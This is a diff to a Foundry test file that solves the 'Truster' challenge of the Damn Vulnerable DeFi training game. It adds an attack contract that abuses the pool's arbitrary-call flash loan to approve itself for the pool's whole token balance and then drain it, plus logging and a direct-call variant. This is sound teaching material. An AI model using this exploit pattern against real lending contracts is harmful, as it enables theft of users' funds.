@@ -6,6 +6,31 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract AttackTruster {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+    address public recovery;
+
+    constructor(address _pool, address _token, address _recovery) {
+        pool = TrusterLenderPool(_pool);
+        token = DamnValuableToken(_token);
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // Craft the data to call approve on the token contract, giving the player allowance to spend the pool's tokens
+        bytes memory _callData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            token.balanceOf(address(pool))
+        );
+
+        // Call flashLoan with 0 amount, but with the data to call approve on the token contract
+        pool.flashLoan(0, address(this), address(token), _callData);
+        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -51,7 +76,46 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        console.log("### test_truster start ###");
+
+        console.log("");
+        console.log("#1 Before attack");
+        console.log("pool balance:", token.balanceOf(address(pool))/1e18);
+        console.log("player balance:", token.balanceOf(address(player))/1e18);
+        console.log("recovery balance:", token.balanceOf(recovery)/1e18);
+
+        console.log("");
+        console.log("#2 Run attack");
+        run_attack();
+
+        console.log("");
+        console.log("#3 After attack");
+        console.log("pool balance:", token.balanceOf(address(pool))/1e18);
+        console.log("player balance:", token.balanceOf(address(player))/1e18);
+        console.log("recovery balance:", token.balanceOf(recovery)/1e18);
+
+        console.log("");
+        console.log("### test_naiveReceiver end ###");
+    }
+
+    function run_attack() internal {
+        AttackTruster attackContract = new AttackTruster(address(pool), address(token), recovery);
+        attackContract.attack();
+    }
+
+    /**
+     * Failure Tests
+     * This test should fail, as vm.getNonce(player) should be 0.
+     */
+    function fail_test_truster() public checkSolvedByPlayer {
+        bytes memory _callData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            player,
+            TOKENS_IN_POOL
+        );
+
+        pool.flashLoan(0, player, address(token), _callData);
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
     }
 
     /**
